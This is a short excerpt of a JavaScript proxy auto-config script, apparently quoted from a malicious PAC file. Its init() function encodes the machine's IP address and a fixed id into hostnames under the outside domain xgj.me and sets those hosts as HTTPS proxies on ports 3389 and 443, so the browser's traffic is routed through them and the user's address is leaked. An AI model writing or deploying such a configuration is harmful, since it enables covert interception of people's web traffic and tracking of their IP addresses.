...
var proxy = "DIRECT;";
var timestamp = "0";
var id = Number(75288350).toString(36);
...
function init() {
  var ip = myIpAddress();
  ip = (convert_addr(ip) >>> 0).toString(36);

  proxy = "HTTPS ssl-" + id + "-" + ip + "-" + timestamp + ".xgj.me:3389;";
  proxy = proxy.concat("HTTPS ssl-" + id + "-" + ip + "-" + timestamp + ".xgj.me:443");
}
init();
